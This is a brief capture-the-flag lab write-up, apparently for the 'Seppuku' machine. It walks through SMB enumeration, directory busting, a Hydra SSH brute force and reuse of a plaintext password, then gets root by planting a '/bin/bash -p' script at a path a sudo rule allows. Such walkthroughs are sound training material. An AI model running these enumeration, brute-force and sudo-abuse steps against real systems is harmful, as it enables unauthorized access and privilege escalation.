### Initial Foothold
Autorecon on 192.168.191.90
Everything was bait. FTP, SMB.
Although enumerating SMB using
```
enum4linux-ng 192.168.237.90 -A -Gm -R -t 15
```
obtain users:
- `seppuku` (RID 1000)
- `samurai` (RID 1001)
- `tanto` (RID 1002)
- `debian` (RID 1003)

Port 7601 which autorecon ignored is the port we need to directory bust.
obtain /secret/ which contains a password list and 3 potential users. seppuku, jack and rabbit-hole.

Hydra ssh with this to obtain seppuku::eeyoree.

### Privesc

sudo -l  
```
(ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
```
This yields nothing.

```
ls -lah
.passwd
cat .passwd
12345685213456!@!@A
```

Login to samurai as with credentials samurai:12345685213456!@!@A
sudo -l
```
(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

The binary `/home/tanto/.cgi_bin/bin` did not exist. SSHed into `tanto`'s account using the private key found on the web server /var/www/html/keys.

Created the `.cgi_bin` directory and a `bin` file containing a root shell:
```
mkdir .cgi_bin
cd .cgi_bin
echo '/bin/bash -p' > bin
chmod +x bin
```

Now exit to samurai account and obtain root by entering the function below
```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```